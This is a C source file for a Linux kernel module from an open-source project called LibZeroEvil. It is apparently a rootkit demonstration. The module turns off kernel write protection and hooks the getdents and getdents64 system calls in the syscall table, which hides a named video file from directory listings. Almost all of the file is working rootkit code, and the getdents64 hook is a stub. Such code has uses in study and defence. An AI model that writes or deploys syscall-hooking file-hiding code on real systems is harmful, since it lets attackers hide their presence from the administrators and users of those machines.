// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/dirent.h> // linux_dirent64.
# include <linux/syscalls.h>

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define SECRET_FILE "032416_525.mp4"


asmlinkage unsigned long **real_sys_call_table;

asmlinkage long
(*real_getdents)(unsigned int fd,
                 struct linux_dirent __user *dirent,
                 unsigned int count);
asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count);

asmlinkage long
(*real_getdents64)(unsigned int fd,
                 struct linux_dirent64 __user *dirent,
                 unsigned int count);
asmlinkage long
fake_getdents64(unsigned int fd,
              struct linux_dirent64 __user *dirent,
              unsigned int count);


int
init_module(void)
{
  fm_alert("%s\n", "Greetings the World!");

  /* No consideration on failure. */
  real_sys_call_table = get_sct();

  disable_wp();
  HOOK_SYS_CALL_TABLE(getdents);
  HOOK_SYS_CALL_TABLE(getdents64);
  enable_wp();

  return 0;
}


void
cleanup_module(void)
{
  disable_wp();
  UNHOOK_SYS_CALL_TABLE(getdents);
  UNHOOK_SYS_CALL_TABLE(getdents64);
  enable_wp();

  fm_alert("%s\n", "Farewell the World!");

  return;
}


asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count)
{
  long ret;

  ret = real_getdents(fd, dirent, count);

  print_dirent(dirent, ret);
  ret = remove_dirent_entry(SECRET_FILE, dirent, ret);
  print_dirent(dirent, ret);

  return ret;
}


// TODO: Find triggering cases. This was not called in my test.
asmlinkage long
fake_getdents64(unsigned int fd,
              struct linux_dirent64 __user *dirent,
              unsigned int count)
{
  long ret;

  fm_alert("==> %s\n", __func__);

  ret = real_getdents64(fd, dirent, count);

  // TODO: Add hooking logic.

  return ret;
}
